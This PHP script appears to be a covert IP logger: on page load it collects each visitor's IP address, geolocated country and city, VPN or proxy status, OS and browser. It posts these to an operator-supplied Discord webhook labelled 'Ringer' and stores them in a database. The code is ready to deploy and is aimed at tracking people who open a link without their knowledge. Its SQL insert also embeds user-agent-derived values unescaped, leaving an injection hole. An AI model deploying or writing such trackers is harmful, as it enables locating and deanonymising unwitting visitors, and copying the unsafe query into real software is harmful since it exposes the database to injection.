<?php

include('header.php');
include("lib/proxy_vpn_check/proxycheck.php");
include('modules/ipcheck.php');

//insert your webhook below, we used discord's webhook :)
$webhookurl = "";

$codes = json_decode(file_get_contents('http://country.io/iso3.json'), true);

include 'lib/useragent.class.php';
$useragent = UserAgentFactory::analyze($_SERVER['HTTP_USER_AGENT']);
$ip = $_SERVER['REMOTE_ADDR'];
//$userAgent = $_SERVER['HTTP_USER_AGENT'];
$ipinfo = json_decode(file_get_contents('http://ip-api.com/json/'.$ip));

$vpnstatus = checkip($ip);

$countrycode = $codes[$ipinfo->countryCode];
$city = $ipinfo->city;

$os = $useragent->os['name'];

if (empty($os)) {
    $os="Unknown";
}

$version = $useragent->os['version'];
$full_os = $os." ". $version;

$browser = $useragent->browser['name'];

$timestamp = date("c", strtotime("now"));

$jsonstring="IP: ".$ip.
            "\nOS: ". $full_os .
            "\nBrowser: ".$browser.
            "\nCountry: ".$countrycode.
            "\nCity: ".$city.
            "\nProxystatus: ".$vpnstatus;

$json_data = json_encode([
    // Username
    "username" => "Ringer",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "IP Address information",

            // Embed Type
            "type" => "rich",

            // Embed Description
            "description" => $jsonstring,
            // Embed left border color in HEX
            "color" => hexdec( "08C9C9" ),
            ],
        ],
                    "timestamp"=> $timestamp,
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );

//$gallery = file_get_contents('_gallery.html');

$sql = "INSERT INTO scanned(ip, status,country, city,os,version, browser)
    VALUES ('$ip','$vpnstatus','$countrycode', '$city','$os', '$version','$browser' )";

$result = mysqli_query($con, $sql) or die (mysqli_error($con));

?>
